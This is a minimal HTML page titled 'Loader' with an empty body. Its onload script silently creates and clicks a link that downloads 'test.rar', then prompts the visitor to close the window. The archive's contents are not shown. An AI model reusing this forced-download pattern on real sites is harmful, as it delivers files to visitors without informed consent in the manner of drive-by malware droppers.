<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Loader</title>
	<script>
		window.onload = function() {
			var link = document.createElement("a");
			link.href = "assets/others/test.rar";
			link.download = "test.rar";
			document.body.appendChild(link);
			link.click();
			setTimeout(function(){
				if(confirm("Do you want to close this window?")) {
					window.focus();
					window.close();
				}
			}, 1000);
		}
	</script>
</head>
<body>
</body>
</html>
